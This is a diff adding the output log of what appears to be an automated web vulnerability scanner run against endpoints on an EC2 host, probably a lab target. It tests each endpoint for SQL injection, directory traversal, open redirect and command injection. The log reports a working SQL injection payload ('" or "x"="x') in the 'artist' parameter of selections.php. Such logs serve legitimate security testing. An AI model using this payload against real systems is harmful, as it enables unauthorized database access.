@@ -1,0 +1,58 @@
+[*] Testing endpoint http://ec2-52-77-254-209.ap-southeast-1.compute.amazonaws.com:8080/
+[*] Testing for SQL Injection
+[*] Testing for Directory Traversal
+[*] Testing for Open Redirect
+[*] Testing for Command Injection
+[*] Testing endpoint http://ec2-52-77-254-209.ap-southeast-1.compute.amazonaws.com:8080/adventure/
+[*] Testing for SQL Injection
+[*] Testing for Directory Traversal
+[*] Testing for Open Redirect
+[*] Testing for Command Injection
+[*] Testing endpoint http://ec2-52-77-254-209.ap-southeast-1.compute.amazonaws.com:8080/random.php
+[*] Testing for SQL Injection
+[*] Testing for Directory Traversal
+[*] Testing for Open Redirect
+[*] Testing for Command Injection
+[*] Testing endpoint http://ec2-52-77-254-209.ap-southeast-1.compute.amazonaws.com:8080/selections.php
+[*] Testing for SQL Injection
+[*] Working payload found!
+(('GET', u'http://ec2-52-77-254-209.ap-southeast-1.compute.amazonaws.com:8080/selections.php', [u'artist'], {}), '" or "x"="x')
+[*] Testing for Directory Traversal
+[*] Testing for Open Redirect
+[*] Testing for Command Injection
+[*] Testing endpoint http://ec2-52-77-254-209.ap-southeast-1.compute.amazonaws.com:8080/selections.php?year=2017
+[*] Testing for SQL Injection
+[*] Testing for Directory Traversal
+[*] Testing for Open Redirect
+[*] Testing for Command Injection
+[*] Testing endpoint http://ec2-52-77-254-209.ap-southeast-1.compute.amazonaws.com:8080/selections.php?year=2016
+[*] Testing for SQL Injection
+[*] Testing for Directory Traversal
+[*] Testing for Open Redirect
+[*] Testing for Command Injection
+[*] Testing endpoint http://ec2-52-77-254-209.ap-southeast-1.compute.amazonaws.com:8080/selections.php?year=1993
+[*] Testing for SQL Injection
+[*] Testing for Directory Traversal
+[*] Testing for Open Redirect
+[*] Testing for Command Injection
+[*] Testing endpoint http://ec2-52-77-254-209.ap-southeast-1.compute.amazonaws.com:8080/selections.php?artist=Nicole Dollanganger
+[*] Testing for SQL Injection
+[*] Testing for Directory Traversal
+[*] Testing for Open Redirect
+[*] Testing for Command Injection
+[*] Testing endpoint http://ec2-52-77-254-209.ap-southeast-1.compute.amazonaws.com:8080/selections.php?artist=Slowdive
+[*] Testing for SQL Injection
+[*] Testing for Directory Traversal
+[*] Testing for Open Redirect
+[*] Testing for Command Injection
+[*] Testing endpoint http://ec2-52-77-254-209.ap-southeast-1.compute.amazonaws.com:8080/selections.php?artist=Mazzy Star
+[*] Testing for SQL Injection
+[*] Testing for Directory Traversal
+[*] Testing for Open Redirect
+[*] Testing for Command Injection
+[*] Testing endpoint http://ec2-52-77-254-209.ap-southeast-1.compute.amazonaws.com:8080/about.php
+[*] Testing for SQL Injection
+[*] Testing for Directory Traversal
+[*] Testing for Open Redirect
+[*] Testing for Command Injection
+[{'class': 'SQL Injection', 'results': {'http://ec2-52-77-254-209.ap-southeast-1.compute.amazonaws.com:8080/': [{'endpoint': u'selections.php', 'params': {u'artist': '" or "x"="x'}, 'method': 'GET'}]}}]
